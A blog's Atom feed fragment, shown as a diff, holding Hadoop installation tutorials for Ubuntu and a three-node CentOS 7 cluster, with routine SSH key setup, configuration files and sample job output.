-<p>Are you sure you want to continue connecting (yes/no)?<br>Type in <code>yes</code> for both these prompts and press the enter key. Once this is done, execute the following command:<br><pre class="code-pre "><code>start-yarn.sh</code></pre><br>Executing the above two commands will get Hadoop up and running. You can verify this by typing in the following command:<br><pre class="code-pre ">`jps</pre></p>
-</blockquote>
-</li>
-</ul>
-<p>Executing this command should show you something similar to the following:</p>
-<p><img src="https://assets.digitalocean.com/articles/Ubuntu_Hadoop/10.png" alt="jps command" title="jps command"></p>
-<p>If you can see a result similar to the depicted in the screenshot above, it means that you now have a functional instance of Hadoop running on your VPS.</p>
-<h3 id="Next-Steps"><a href="#Next-Steps" class="headerlink" title="Next Steps"></a>Next Steps</h3><p>If you have an application that is set up to use Hadoop, you can fire that up and start using it with the new installation. On the other hand, if you’re just playing around and exploring Hadoop, you can start by adding/manipulating data or files on the new filesystem to get a feel for it.</p>
-<div class="author">Submitted by: <a href="http://javascript.asia/" target="_blank" rel="external">Jay</a></div><br><div class="author">Refer to :<a href="https://www.digitalocean.com/community/tutorials/how-to-install-hadoop-on-ubuntu-13-10" target="_blank" rel="external">https://www.digitalocean.com/community/tutorials/how-to-install-hadoop-on-ubuntu-13-10</a></div>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h3 id=&quot;Prerequisites&quot;&gt;&lt;a href=&quot;#Prerequisites&quot; class=&quot;headerlink&quot; title=&quot;Prerequisites&quot;&gt;&lt;/a&gt;Prerequisites&lt;/h3&gt;&lt;p&gt;The only prerequisite for this tutorial is a VPS with &lt;strong&gt;Ubuntu 13.10 x64&lt;/strong&gt; installed.&lt;/p&gt;
-&lt;p&gt;You will need to execute commands from the command line which you can do in one of the two ways:&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;Use SSH to access the droplet.&lt;/li&gt;
-&lt;li&gt;Use the ‘Console Access’ from the Digital Ocean Droplet Management Panel&lt;div data-unique=&quot;what-is-hadoop&quot;&gt;&lt;/div&gt;
-
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h2 id=&quot;What-is-Hadoop&quot;&gt;&lt;a href=&quot;#What-is-Hadoop&quot; class=&quot;headerlink&quot; title=&quot;What is Hadoop?&quot;&gt;&lt;/a&gt;What is Hadoop?&lt;/h2&gt;
-    
-    </summary>
-    
-      <category term="Tutorial" scheme="http://timeorigin.cn/categories/Tutorial/"/>
-    
-    
-      <category term="hadoop" scheme="http://timeorigin.cn/tags/hadoop/"/>
-    
-      <category term="ubuntu" scheme="http://timeorigin.cn/tags/ubuntu/"/>
-    
-      <category term="HDFS" scheme="http://timeorigin.cn/tags/HDFS/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Install Apache Hadoop on CentOS 7</title>
-    <link href="http://timeorigin.cn/install-apache-hadoop-on-centos-7/"/>
-    <id>http://timeorigin.cn/install-apache-hadoop-on-centos-7/</id>
-    <published>2016-06-06T09:16:43.000Z</published>
-    <updated>2016-09-30T04:40:51.785Z</updated>
-    
-    <content type="html"><![CDATA[<table class="base" summary="1"><br><tbody><br><tr><br><td class="num"></td><br><td><br><div class="block">Install Apache Hadoop to build Distributed File System.</div><br><div class="block">This example is based on the environment below.</div><br><div class="block">1) dlp.srv.world (Master Node)<br>2) node01.srv.world (Slave Node)<br>3) node02.srv.world (Slave Node)</div></td><br></tr><br><tr><br><td class="num">[1]</td><br><td><br><div class="block"><a href="http://www.server-world.info/en/note?os=CentOS_7&amp;p=jdk8" target="_blank" rel="external">Install JDK on all Nodes, refer to here</a>.</div></td><br></tr><br><tr><br><td class="num">[2]</td><br><td>Create a user for Hadoop on all Nodes.</td><br></tr><br></tbody><br></table><br><table class="term" summary="2-1"><br><tbody><br><tr><br><td>[root@dlp ~]#<br><div class="color1"><a href="http://www.server-world.info/en/command/html/useradd.html" target="_blank" rel="external">useradd</a> -d /usr/hadoop hadoop</div><br>[root@dlp ~]#<br><div class="color1"><a href="http://www.server-world.info/en/command/html/chmod.html" target="_blank" rel="external">chmod</a> 755 /usr/hadoop</div><br>[root@dlp ~]#<br><div class="color1"><a href="http://www.server-world.info/en/command/html/passwd.html" target="_blank" rel="external">passwd</a> hadoop</div><br>Changing password for user hadoop.<br>New password:<br>Retype new password:<br>passwd: all authentication tokens updated successfully.</td><br></tr><br></tbody><br></table><br><table class="base" summary="3"><br><tbody><br><tr><br><td class="num">[3]</td><br><td>Login as hadoop user to Master Node and create SSH key-pair (no-passphrase) and send it to other nodes.</td><br></tr><br></tbody><br></table><br><table class="term" summary="3-1"><br><tbody><br><tr><br><td><br><div class="block"><br><br>[hadoop@dlp ~]$<br><div class="color1">ssh-keygen</div><br>Generating public/private rsa key pair.<br>Enter file in which to save the key (/usr/hadoop/.ssh/id_rsa):<br>Created directory ‘/usr/hadoop/.ssh’.<br>Enter passphrase (empty for no passphrase):<br>Enter same passphrase again:<br>Your identification has been saved in /usr/hadoop/.ssh/id_rsa.<br>Your public key has been saved in /usr/hadoop/.ssh/id_rsa.pub.<br>The key fingerprint is:<br>xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx hadoop@dlp.srv.world<br>The key’s randomart image is:<br><br></div><br><div class="color2"># send key to nodes included localhost</div><br>[hadoop@dlp ~]$<br><div class="color1">ssh-copy-id localhost</div><br>The authenticity of host ‘localhost (::1)’ can’t be established.<br>ECDSA key fingerprint is xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx.<br>Are you sure you want to continue connecting (yes/no)?<br><div class="color1">yes</div><br><pre>/bin/ssh-copy-id: INFO: attempting to log in with the new key(s), to filter out any that are already installed<br>/bin/ssh-copy-id: INFO: 1 key(s) remain to be installed – if you are prompted now it is to install the new keys<br>hadoop@localhost’s password:<br><br>Number of key(s) added: 1<br><br>Now try logging into the machine, with:   “ssh ‘localhost’”<br>and check to make sure that only the key(s) you wanted were added.<br><br></pre><br>[hadoop@dlp ~]$<br><div class="color1">ssh-copy-id node01.srv.world</div><br>[hadoop@dlp ~]$<br><div class="color1">ssh-copy-id node02.srv.world</div></td><br></tr><br></tbody><br></table><br><table class="base" summary="4"><br><tbody><br><tr><br><td class="num">[4]</td><br><td>Install Hadoop on all Nodes. Work as hadoop user.<br>Make sure the latest version of Hadoop on the site below before downloading.<br>⇒ <a href="https://hadoop.apache.org/releases.html" target="_blank" rel="external">https://hadoop.apache.org/releases.html</a></td><br></tr><br></tbody><br></table><br><table class="term" summary="4-1"><br><tbody><br><tr><br><td>[hadoop@dlp ~]$<br><div class="color1">curl -O <a href="http://ftp.jaist.ac.jp/pub/apache/hadoop/common/hadoop-2.7.1/hadoop-2.7.1.tar.gz" target="_blank" rel="external">http://ftp.jaist.ac.jp/pub/apache/hadoop/common/hadoop-2.7.1/hadoop-2.7.1.tar.gz</a></div><br>[hadoop@dlp ~]$<br><div class="color1"><a href="http://www.server-world.info/en/command/html/tar.html" target="_blank" rel="external">tar</a> zxvf hadoop-2.7.1.tar.gz -C /usr/hadoop –strip-components 1</div><br><div class="block"><br><br>[hadoop@dlp ~]$<br><div class="color1"><a href="http://www.server-world.info/en/command/html/vi.html" target="_blank" rel="external">vi</a> ~/.bash_profile</div><br></div><br><div class="block"><br><div class="color2"># add follows to the end</div><br><div class="color1">export HADOOP_HOME=/usr/hadoop<br>export HADOOP_COMMON_HOME=$HADOOP_HOME<br>export HADOOP_HDFS_HOME=$HADOOP_HOME<br>export HADOOP_MAPRED_HOME=$HADOOP_HOME<br>export HADOOP_YARN_HOME=$HADOOP_HOME<br>export HADOOP_OPTS=”-Djava.library.path=$HADOOP_HOME/lib/native”<br>export HADOOP_COMMON_LIB_NATIVE_DIR=$HADOOP_HOME/lib/native<br>export PATH=$PATH:$HADOOP_HOME/sbin:$HADOOP_HOME/bin</div><br></div><br>[hadoop@dlp ~]$<br><div class="color1">source ~/.bash_profile</div></td><br></tr><br></tbody><br></table><br><table class="base" summary="5"><br><tbody><br><tr><br><td class="num">[5]</td><br><td>Configure Hadoop on Master Node. Work as hadoop user.</td><br></tr><br></tbody><br></table><br><table class="term" summary="5-1"><br><tbody><br><tr><br><td><br><div class="block"><br><div class="color2"># create directory for data on all nodes.</div><br>[hadoop@dlp ~]$<br><div class="color1"><a href="http://www.server-world.info/en/command/html/mkdir.html" target="_blank" rel="external">mkdir</a> ~/datanode</div><br>[hadoop@dlp ~]$<br><div class="color1">ssh node01.srv.world “mkdir ~/datanode”</div><br>[hadoop@dlp ~]$<br><div class="color1">ssh node02.srv.world “mkdir ~/datanode”</div><br></div><br><div class="block"><br><br>[hadoop@dlp ~]$<br><div class="color1"><a href="http://www.server-world.info/en/command/html/vi.html" target="_blank" rel="external">vi</a> ~/etc/hadoop/hdfs-site.xml</div><br></div><br><div class="block"><br><div class="color2"># add into &lt;configuration&gt; - &lt;/configuration&gt; section</div><br>&lt;configuration&gt;<br><div class="color1">  &lt;property&gt;<br>&lt;name&gt;dfs.replication&lt;/name&gt;<br>&lt;value&gt;2&lt;/value&gt;<br>&lt;/property&gt;<br>&lt;property&gt;<br>&lt;name&gt;dfs.datanode.data.dir&lt;/name&gt;<br>&lt;value&gt;file:///usr/hadoop/datanode&lt;/value&gt;<br>&lt;/property&gt;</div><br>&lt;/configuration&gt;<br><br></div><br><div class="block"><br><div class="color2"># send to slaves</div><br>[hadoop@dlp ~]$<br><div class="color1">scp ~/etc/hadoop/hdfs-site.xml node01.srv.world:~/etc/hadoop/</div><br>[hadoop@dlp ~]$<br><div class="color1">scp ~/etc/hadoop/hdfs-site.xml node02.srv.world:~/etc/hadoop/</div><br></div><br><div class="block"><br><br>[hadoop@dlp ~]$<br><div class="color1"><a href="http://www.server-world.info/en/command/html/vi.html" target="_blank" rel="external">vi</a> ~/etc/hadoop/core-site.xml</div><br></div><br><div class="block"><br><div class="color2"># add into &lt;configuration&gt; - &lt;/configuration&gt; section</div><br>&lt;configuration&gt;<br><div class="color1">  &lt;property&gt;<br>&lt;name&gt;fs.defaultFS&lt;/name&gt;<br>&lt;value&gt;hdfs://dlp.srv.world:9000/&lt;/value&gt;<br>&lt;/property&gt;</div><br>&lt;/configuration&gt;<br><br></div><br><div class="block"><br><div class="color2"># send to slaves</div><br>[hadoop@dlp ~]$<br><div class="color1">scp ~/etc/hadoop/core-site.xml node01.srv.world:~/etc/hadoop/</div><br>[hadoop@dlp ~]$<br><div class="color1">scp ~/etc/hadoop/core-site.xml node02.srv.world:~/etc/hadoop/</div><br></div><br><div class="block"><br><br>[hadoop@dlp ~]$<br><div class="color1">sed -i -e ‘s/\${JAVA_HOME}/\/usr\/java\/default/‘ ~/etc/hadoop/hadoop-env.sh</div><br><div class="color2"># send to slaves</div><br>[hadoop@dlp ~]$<br><div class="color1">scp ~/etc/hadoop/hadoop-env.sh node01.srv.world:~/etc/hadoop/</div><br>[hadoop@dlp ~]$<br><div class="color1">scp ~/etc/hadoop/hadoop-env.sh node02.srv.world:~/etc/hadoop/</div><br></div><br>[hadoop@dlp ~]$<br><div class="color1"><a href="http://www.server-world.info/en/command/html/mkdir.html" target="_blank" rel="external">mkdir</a> ~/namenode</div><br><div class="block"><br><br>[hadoop@dlp ~]$<br><div class="color1"><a href="http://www.server-world.info/en/command/html/vi.html" target="_blank" rel="external">vi</a> ~/etc/hadoop/hdfs-site.xml</div><br></div><br><div class="block"><br><div class="color2"># add into &lt;configuration&gt; - &lt;/configuration&gt; section</div><br>&lt;configuration&gt;<br><div class="color1">  &lt;property&gt;<br>&lt;name&gt;dfs.namenode.name.dir&lt;/name&gt;<br>&lt;value&gt;file:///usr/hadoop/namenode&lt;/value&gt;<br>&lt;/property&gt;</div><br>&lt;/configuration&gt;<br><br></div><br><div class="block"><br><br>[hadoop@dlp ~]$<br><div class="color1"><a href="http://www.server-world.info/en/command/html/vi.html" target="_blank" rel="external">vi</a> ~/etc/hadoop/mapred-site.xml</div><br></div><br><div class="block"><br><div class="color1"><br><div class="color2"># create new</div><br>&lt;configuration&gt;<br>&lt;property&gt;<br>&lt;name&gt;mapreduce.framework.name&lt;/name&gt;<br>&lt;value&gt;yarn&lt;/value&gt;<br>&lt;/property&gt;<br>&lt;/configuration&gt;<br><br></div><br></div><br><div class="block"><br><br>[hadoop@dlp ~]$<br><div class="color1"><a href="http://www.server-world.info/en/command/html/vi.html" target="_blank" rel="external">vi</a> ~/etc/hadoop/yarn-site.xml</div><br></div><br><div class="block"><br><div class="color2"># add into &lt;configuration&gt; - &lt;/configuration&gt; section</div><br>&lt;configuration&gt;<br><div class="color1">  &lt;property&gt;<br>&lt;name&gt;yarn.resourcemanager.hostname&lt;/name&gt;<br>&lt;value&gt;dlp.srv.world&lt;/value&gt;<br>&lt;/property&gt;<br>&lt;property&gt;<br>&lt;name&gt;yarn.nodemanager.hostname&lt;/name&gt;<br>&lt;value&gt;dlp.srv.world&lt;/value&gt;<br>&lt;/property&gt;<br>&lt;property&gt;<br>&lt;name&gt;yarn.nodemanager.aux-services&lt;/name&gt;<br>&lt;value&gt;mapreduce_shuffle&lt;/value&gt;<br>&lt;/property&gt;</div><br>&lt;/configuration&gt;<br><br></div><br><div class="block"><br><br>[hadoop@dlp ~]$<br><div class="color1"><a href="http://www.server-world.info/en/command/html/vi.html" target="_blank" rel="external">vi</a> ~/etc/hadoop/slaves</div><br></div><br><div class="color2"># add all nodes (remove localhost)</div><br><div class="color1">dlp.srv.world<br>node01.srv.world<br>node02.srv.world</div></td><br></tr><br></tbody><br></table><br><table class="base" summary="6"><br><tbody><br><tr><br><td class="num">[6]</td><br><td>Format NameNode and start Hadoop services.</td><br></tr><br></tbody><br></table><br><table class="term" summary="6-1"><br><tbody><br><tr><br><td>[hadoop@dlp ~]$<br><div class="color1">hdfs namenode -format</div><br><pre>15/07/28 19:58:14 INFO namenode.NameNode: STARTUP_MSG:<br>/<strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><em>**</em></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong><br>STARTUP_MSG: Starting NameNode<br>STARTUP_MSG:   host = dlp.srv.world/10.0.0.30<br>STARTUP_MSG:   args = [-format]<br>STARTUP_MSG:   version = 2.7.1<br>…..<br>…..<br>15/07/28 19:58:17 INFO namenode.NameNode: SHUTDOWN_MSG:<br>/<strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><em>**</em></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong><br>SHUTDOWN_MSG: Shutting down NameNode at dlp.srv.world/10.0.0.30<br><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><em>**</em></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>/<br><br></pre><br>[hadoop@dlp ~]$<br><div class="color1">start-dfs.sh</div><br><pre>Starting namenodes on [dlp.srv.world]<br>dlp.srv.world: starting namenode, logging to /usr/hadoop/logs/hadoop-hadoop-namenode-dlp.srv.world.out<br>dlp.srv.world: starting datanode, logging to /usr/hadoop/logs/hadoop-hadoop-datanode-dlp.srv.world.out<br>node02.srv.world: starting datanode, logging to /usr/hadoop/logs/hadoop-hadoop-datanode-node02.srv.world.out<br>node01.srv.world: starting datanode, logging to /usr/hadoop/logs/hadoop-hadoop-datanode-node01.srv.world.out<br>Starting secondary namenodes [0.0.0.0]<br>0.0.0.0: starting secondarynamenode, logging to /usr/hadoop/logs/hadoop-hadoop-secondarynamenode-dlp.srv.world.out<br><br></pre><br>[hadoop@dlp ~]$<br><div class="color1">start-yarn.sh</div><br><pre>starting yarn daemons<br>starting resourcemanager, logging to /usr/hadoop/logs/yarn-hadoop-resourcemanager-dlp.srv.world.out<br>dlp.srv.world: starting nodemanager, logging to /usr/hadoop/logs/yarn-hadoop-nodemanager-dlp.srv.world.out<br>node02.srv.world: starting nodemanager, logging to /usr/hadoop/logs/yarn-hadoop-nodemanager-node02.srv.world.out<br>node01.srv.world: starting nodemanager, logging to /usr/hadoop/logs/yarn-hadoop-nodemanager-node01.srv.world.out<br><br></pre><br><div class="color2"># show status (it’s OK if result is like follows)</div><br>[hadoop@dlp ~]$<br><div class="color1">jps</div><br>2130 NameNode<br>2437 SecondaryNameNode<br>2598 ResourceManager<br>2710 NodeManager<br>3001 Jps<br>2267 DataNode</td><br></tr><br></tbody><br></table><br><table class="base" summary="7"><br><tbody><br><tr><br><td class="num">[7]</td><br><td>Execute a sample program to make sure it works normally.</td><br></tr><br></tbody><br></table><br><table class="term" summary="7-1"><br><tbody><br><tr><br><td><br><div class="block"><br><div class="color2"># create a directory</div><br>[hadoop@dlp ~]$<br><div class="color1">hdfs dfs -mkdir /test</div><br></div><br><div class="block"><br><div class="color2"># copy a local file to /test</div><br>[hadoop@dlp ~]$<br><div class="color1">hdfs dfs -copyFromLocal ~/NOTICE.txt /test</div><br></div><br><div class="color2"># show contents of a file</div><br>[hadoop@dlp ~]$<br><div class="color1">hdfs dfs -cat /test/NOTICE.txt</div><br><pre>This product includes software developed by The Apache Software<br>Foundation (<a href="http://www.apache.org/" target="_blank" rel="external">http://www.apache.org/</a>).<br><br></pre><br><div class="color2"># execute a sample program</div><br>[hadoop@dlp ~]$<br><div class="color1">hadoop jar ~/share/hadoop/mapreduce/hadoop-mapreduce-examples-2.7.1.jar wordcount /test/NOTICE.txt /output01</div><br><pre>15/07/28 19:28:47 INFO client.RMProxy: Connecting to ResourceManager at dlp.srv.world/10.0.0.30:8032<br>15/07/28 19:28:48 INFO input.FileInputFormat: Total input paths to process : 1<br>15/07/28 19:28:48 INFO mapreduce.JobSubmitter: number of splits:1<br>…..<br>…..<br><br></pre><br><div class="color2"># show results</div><br>[hadoop@dlp ~]$<br><div class="color1">hdfs dfs -ls /output01</div><br><pre>Found 2 items<br>-rw-r–r–   2 hadoop supergroup      0 2015-07-29 14:29 /output01/_SUCCESS<br>-rw-r–r–   2 hadoop supergroup    123 2015-07-29 14:29 /output01/part-r-00000<br><br></pre><br><div class="color2"># show contents of a file of results (wordcounts is generated)</div><br>[hadoop@dlp ~]$<br><div class="color1">hdfs dfs -cat /output01/part-r-00000</div><br><pre>(<a href="http://www.apache.org/" target="_blank" rel="external">http://www.apache.org/</a>).       1<br>Apache          1<br>Foundation      1<br>Software        1<br>The             1<br>This            1<br>by              1<br>developed       1<br>includes        1<br>product         1<br>software        1<br></pre><br></td><br></tr><br></tbody><br></table><br><table class="base_win" summary="8"><br><tbody><br><tr><br><td class="num">[8]</td><br><td>Access to “<a href="http://(server&#39;s" target="_blank" rel="external">http://(server&#39;s</a> hostname or IP address):50070/“, then it’s possbile to see Hadoop cluster’s summary.</td><br></tr><br></tbody><br></table><br><table class="base_win" summary="8-1"><br><tbody><br><tr><br><td><img src="https://www.server-world.info/en/CentOS_7/hadoop/img/1.png" alt=""></td><br></tr><br></tbody><br></table><br><table class="base_win" summary="9"><br><tbody><br><tr><br><td class="num">[9]</td><br><td>Access to <a href="http://(server&#39;s" target="_blank" rel="external">http://(server&#39;s</a> hostname or IP address):8088/“, then then it’s possbile to see Hadoop cluster’s information.</td><br></tr><br></tbody><br></table><br><table class="base_win" summary="9-1"><br><tbody><br><tr><br><td><img src="https://www.server-world.info/en/CentOS_7/hadoop/img/2.png" alt=""></td><br></tr><br></tbody><br></table>]]></content>
-    
-    <summary type="html">
-    
-      &lt;table class=&quot;base&quot; summary=&quot;1&quot;&gt;&lt;br&gt;&lt;tbody&gt;&lt;br&gt;&lt;tr&gt;&lt;br&gt;&lt;td class=&quot;num&quot;&gt;&lt;/td&gt;&lt;br&gt;&lt;td&gt;&lt;br&gt;&lt;div class=&quot;block&quot;&gt;Install Apache Hadoop to build Di
-    
-    </summary>
-    
-      <category term="Apache" scheme="http://timeorigin.cn/categories/Apache/"/>
-    
     
   </entry>
   
